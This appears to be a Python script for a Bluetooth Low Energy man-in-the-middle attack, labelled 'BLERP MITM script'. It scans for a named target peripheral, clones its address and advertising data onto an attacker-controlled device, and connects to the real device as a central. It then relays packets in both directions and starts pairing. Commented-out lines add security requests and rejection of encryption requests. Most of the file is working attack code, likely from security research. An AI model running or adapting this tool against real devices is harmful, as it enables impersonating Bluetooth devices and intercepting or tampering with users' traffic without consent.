import argparse
import asyncio
import logging
import sys
import time

from ble import Device
from constants import (
    BLE_L2CAP_CID_ATT,
    BLE_L2CAP_CID_SM,
    BLE_ROLE_CENTRAL,
    BLE_ROLE_PERIPHERAL,
)
from helpers import (
    HCI_Cmd_LE_Custom_Command,
    HCI_Cmd_LE_Set_Public_Address,
    SM_Security_Request,
    l2cap_send,
)
from scapy.layers.bluetooth import (
    ATT_Read_By_Group_Type_Response,
    HCI_Hdr,
    HCI_LE_Meta_Connection_Complete,
    HCI_LE_Meta_Connection_Update_Complete,
    L2CAP_Connection_Parameter_Update_Request,
    SM_DHKey_Check,
    SM_Pairing_Request,
    SM_Pairing_Response,
    SM_Public_Key,
)

# authreq = bonding << 0 | mitm << 2 | sc << 3 | keypress << 4


class Mitm:
    peripheral_task = None
    central_task = None

    def __init__(
        self,
        dev_id_cent: int,
        dev_id_prph: int,
    ):
        self.peripheral = Device(
            id=dev_id_prph,
            role=BLE_ROLE_PERIPHERAL,
        )
        self.central = Device(
            id=dev_id_cent,
            role=BLE_ROLE_CENTRAL,
        )

        self.waiting_msg_from = None
        self.transparent = True


def foward_to_dev(dev_from: Device, dev_to: Device):
    logging.info("Forwarding...")
    while True:
        pkt = dev_from.on_message_rx(dev_from.receive())
        if pkt is not None:
            dev_to.forward(pkt)


async def main(mitm: Mitm):
    # Create background tasks for forwarding
    peripheral_task = asyncio.create_task(
        asyncio.to_thread(foward_to_dev, mitm.peripheral, mitm.central)
    )
    central_task = asyncio.create_task(
        asyncio.to_thread(foward_to_dev, mitm.central, mitm.peripheral)
    )

    # We tell Peripheral controller to reject enc reqs
    # mitm.peripheral.hci_send_cmd(HCI_Cmd_LE_Custom_Command(opcode=0))

    # Start advertising with malicious Peripheral and wait for the connection

    # prph_addr = prph_addr[:-1] + "7"
    mitm.peripheral.stop_advertising()
    mitm.peripheral.start_advertising()

    # TODO: maybe async this to start pairing in the background once the connection is established

    mitm.central.start_pairing(False)

    # False means we do not block

    # Store the tasks in the Mitm instance so we can manage them later
    mitm.peripheral_task = peripheral_task
    mitm.central_task = central_task

    # Return the tasks in case we need to cancel or await them later
    return peripheral_task, central_task


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="BLERP MITM script.")
    parser.add_argument(
        "--central-addr",
        type=str,
        required=True,
        help="Central address, e.g., AA:BB:CC:DD:EE:FF",
    )
    parser.add_argument(
        "--central-addr-type",
        type=str,
        default="public",
        choices=["public", "random"],
        help="Central address type (public or random)",
    )
    parser.add_argument(
        "--peripheral-name",
        type=str,
        required=True,
        help="Peripheral device name",
    )
    parser.add_argument(
        "--dev-ids",
        type=str,
        default="0,1",
        help="Comma-separated HCI device IDs, e.g., 0,1",
    )
    args = parser.parse_args()

    addr_type_map = {"public": 0, "random": 1}

    # Parse device IDs from comma-separated string to list of integers
    dev_ids = [int(x.strip()) for x in args.dev_ids.split(",")]

    mitm = Mitm(dev_ids[0], dev_ids[1])

    # input("Disconnect your devices and then press any key to proceed...")

    # Enable or disable packets passthru
    mitm.transparent = True

    mitm.central.initialize(args.central_addr, addr_type_map[args.central_addr_type])

    # Peripheral address and address type are inferred from advertisement data
    prph_addr, prph_addr_type, adv_data = mitm.central.start_targeted_scan(
        target=args.peripheral_name, get_data=True
    )

    mitm.peripheral.initialize(prph_addr, prph_addr_type, 1)
    mitm.peripheral.set_adv_data(adv_data)

    mitm.peripheral.forwarding = True
    mitm.central.forwarding = True

    mitm.central.connect(mitm.peripheral.addr, mitm.peripheral.addr_type)

    # Start background listening tasks
    tasks = asyncio.run(main(mitm))

    # asyncio.run(main(mitm))
    # Legitimate Central is connected, wait for packets

    # Send security request to the Central
    # sec_req = mitm.peripheral.sm.pair()
    # mitm.peripheral.sm_send(sec_req)

    # # Async routine to handle connection and get address
    # # mitm.peripheral.spoof_peripheral(addr=targets["p"])
    # mitm.peripheral.set_peripheral_mode()
    # print("Peripheral advertising")
    # # Set reject encryption flag
    # # if not mitm.transparent:
    # #     mitm.peripheral.hci_send_cmd(HCI_Cmd_LE_Custom_Command(opcode=0))

    # mitm.waiting_msg_from = mitm.peripheral.id
    # # This should do the rest
    # while True:
    #     mitm.on_message_rx()
